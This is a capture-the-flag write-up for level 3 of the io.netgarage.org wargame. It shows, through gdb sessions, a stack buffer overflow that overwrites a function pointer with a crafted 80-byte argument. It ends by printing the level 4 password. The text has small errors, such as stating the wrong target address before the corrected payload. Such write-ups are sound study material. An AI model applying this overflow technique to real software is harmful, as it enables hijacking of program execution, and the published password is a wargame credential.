---

title: Level 3
link: ssh level3@io.netgarage.org

---

The level 3 starts the same way the level2 does: looking at the source code.

1. `good` is the function to call to clear the stage
2. `bad` seems to be the default function, referenced in the main.
3. The only argument need to be string of length more than 4
4. All chars of the argument will be copied in the buffer (max of 50)
5. All chars except last 4 ones will be set to 0

The 4. part actually duplicate the value of `argv[2]` into `buffer`. We can see this by stepping through the program:

    $ gdb level03
    (gdb) break main
    (gdb) run "aaaaa"
    (gdb) n (multiple times)
    (gdb) n
    24              memcpy(buffer, argv[1], strlen(argv[1]));
    (gdb) display buffer
    1: buffer = "aaaaa\267\000\000\000\000}0,\000\001\000\000\000\035\203\004\b(\376\377\277/\000\000\000H\231\004\bb\206\004\b\002\000\000\00 0\004\375\377\277\020\375\377\277" 

but, in the 5., a `\0` is inserted at the start of the buffer, and making it an "empty string" (`\0` being the NUL char).

One interesting feature of this code, is that the `functionpointer` is defined after `buffer` in the memory, this is because the memory is stored on a stack:

    (gdb) display &buffer
    (gdb) display &functionpointer
    3: &buffer = (char (*)[50]) 0xbffffc1a
    4: &functionpointer = (void (**)(void)) 0xbffffc4c

Moreover, you can see the content of the stack with the `esp` register, with the `x/32` gdb command:

    (gdb) x/32 $esp
    0xbffffc20:     0xbffffc40      0xbffffe68      0x00000005      0x08048274
    0xbffffc30:     0xb7fff930      0x00000000      0x000000bf      0xb7eb7f16
    0xbffffc40:     0x61616161      0xbffffc61      0xb7e2ebf8      0xb7e53243
    0xbffffc50:     0x00000000      0x080497c8      0xbffffc68      0x08048338
    0xbffffc60:     0xbffffe58      0x080497c8      0xbffffc98      0x080485a9
    0xbffffc70:     0x08048590      0x080483d0      0x00000000      0xb7e533fd
    0xbffffc80:     0xb7fcb3c4      0xb7fff000      0x0804859b      0x080484a4
    0xbffffc90:     0x08048590      0x00000000      0x00000000      0xb7e3ba63

You can see the `0x61616161` value at address `0xbffffc40`, this correspond to the `aaaaa` argument (`0x61` being the ASCII value for `a`).
 If we execute the end of the program, we will have the value of the address to jump to:

    (gdb) cont
    Continuing.
    This is exciting we're going to 0x80484a4
    I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
    [Inferior 1 (process 23201) exited normally]

The `bad` address is present in the stack at address `0xbffffc8c`:

    (gdb) x/w 0xbffffc8c
    0xbffffc8c:     0x080484a4

Now if we try to run the program with more than 50 char as the input, it should override the stack memory:

    (gdb) run $(python -c 'print "A"*80')
    Starting program: /levels/level03 $(python -c 'print "A"*80')

    Breakpoint 2, 0x08048530 in main ()
    (gdb) x/32 $esp
    0xbffffbd0:     0xbffffbf0      0xbffffe1d      0x00000050      0x08048274
    0xbffffbe0:     0xb7fff930      0x00000000      0x000000bf      0xb7eb7f16
    0xbffffbf0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffc00:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffc10:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffc20:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffc30:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffc40:     0x08048590      0x00000000      0x00000000      0xb7e3ba63
    (gdb) cont
    Continuing.
    This is exciting we're going to 0x41414141

    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()

We can override the buffer with arbitrary data. In the current overflow, the last 4 bytes replace the function being executed.

So, we know the 76 first bytes can be random, and the last 4 should form the address `0x080484a4`, thus:

    (gdb) run $(python -c 'print "A"*76 + "\x08\x04\x84\x74"')
    Starting program: /levels/level03 $(python -c 'print "A"*76 + "\x08\x04\x84\x74"')

    Breakpoint 1, 0x08048530 in main ()
    (gdb) x/32wx $esp
    0xbffffbd0:     0xbffffbf0      0xbffffe1d      0x00000050      0x08048274
    0xbffffbe0:     0xb7fff930      0x00000000      0x000000bf      0xb7eb7f16
    0xbffffbf0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffc00:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffc10:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffc20:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffc30:     0x41414141      0x41414141      0x41414141      0x74840408
    0xbffffc40:     0x08048590      0x00000000      0x00000000      0xb7e3ba63

As you can see the address is reversed, it's because the x86 processor is little endian, so we need to transfer the address backward:


    (gdb) run $(python -c 'print "A"*76 + "\x74\x84\x04\x08"')
    Starting program: /levels/level03 $(python -c 'print "A"*76 + "\x74\x84\x04\x08"')

    Breakpoint 1, 0x08048530 in main ()
    (gdb) c
    Continuing.
    This is exciting we're going to 0x8048474
    Win.

Level 4 password: `7WhHa5HWMNRAYl9T`
